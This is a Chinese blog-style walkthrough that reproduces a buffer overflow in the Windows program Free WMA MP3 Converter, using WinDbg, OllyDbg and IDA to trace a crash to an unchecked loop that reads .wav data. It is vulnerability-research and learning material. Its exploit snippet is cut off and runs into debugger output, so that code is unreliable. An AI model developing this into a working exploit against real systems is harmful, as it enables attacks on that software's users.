## 简介
### 调试环境
    winxp sp3、windbg、ollydbg、IDA
    软件下载地址https://www.exploit-db.com/apps/21fdca9b7d302479e989b9d062a276df-FWMCSetup.exe
### 软件简介
Free WMA MP3 Converter，Windows系统上，一个免费的媒体格式转换器。
### 调试简介
此漏洞发生在FWMCon.exe的sub_4B0FF4函数由于转换文件格式时，复制音频文件时对音频文件的长度没有进行有效检查，从而导致了缓冲区溢出的发生
这个漏洞是复现学长的漏洞，原文链接见文末。这个漏洞原先调试过一遍，但是第一遍的时候迷迷糊糊的，搞了两天就放弃了，今天看到我同学辉哥的复现学长的博客发现，竟然看懂了，就自己动手复现了一遍。
## POC
学长提供的EXP
    import struct
    def little_endian(address):
      return struct.pack(" kb
    ChildEBP RetAddr  Args to Child              
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    01e3fee4 41414141 41414141 41414141 41414141 0x41414141
    01e3ffa0 00404172 01e3ffdc 00403cc8 01e3ffb4 0x41414141
    01e3ffb4 7c80b713 00ba83cc 00000000 e7ffffff image00400000+0x4172
    01e3ffec 00000000 00404148 00ba83cc 00000000 kernel32!GetModuleFileNameA+0x1b4
可以看出最上层函数的数据明显已经被完全破覆盖了，所以我们从第二个方法开始调试，其返回地址是`00404172`，我们从IDA中找到它的上一个位置`00404170`。  
重新运行程序，并且用ollydbg在`00404170`位置设置断点。运行程序，停在`00404170`位置。
`00404170 ffd2 call edx {image00400000+0x21a38 (00421a38)}`
这条指令call了一个`00421a38`位置的函数，那我们单步步入该函数，不断的单步执行。当运行过
`00421a6c ff5204 call dword ptr [edx+4] ds:0023:004ac400=004ad250`
的时候程序崩溃，说明问题出在，该条指令调用的`004ad250`位置的函数中，重新运行程序，并在`004ad250`处设置断点，进入该函数后，单步执行，重复上述过程，就会一次碰到这些函数
    00404170 ffd2            call    edx {image00400000+0x21a38 (00421a38)}
    00421a6c ff5204          call    dword ptr [edx+4]    ds:0023:004ac400=004ad250
    004ad284 ff523c          call    dword ptr [edx+3Ch]  ds:0023:004b3f6c=004b4274
    004b42c1 e8728dffff      call    image00400000+0xad038 (004ad038)
    004ad067 ff5244          call    dword ptr [edx+44h]  ds:0023:004aebc0=004ad710
    004ad771 ff5268          call    dword ptr [edx+68h]  ds:0023:004aebe4=004af5fc
    004af66f e880190000      call    image00400000+0xb0ff4 (004b0ff4)
当进入最后一个`004b0ff4`位置的函数时，单步执行就会发现，当代码执行到一个阶段的时候就会不断的循环(这一部分用Ollydbg看会比较明显)。
这个循环是`loc_4b102f,loc_4b14b9,loc_4b14e3`这三个函数的互相调用，功能是循环把.wav文件中的数据读入，但是并没有进行文件长度的检查。这个功能可以通过查看ESP中的内容来了解。
第5轮循环：
    0:005> p
    eax=00000001 ebx=00000005 ecx=7c80189c edx=00000001 esi=00bb301c edi=00000000
    eip=004b14bd esp=0194eec8 ebp=004ac384 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    image00400000+0xb14bd:
    004b14bd 7424            je      image00400000+0xb14e3 (004b14e3)        [br=0]
    0:005> dd esp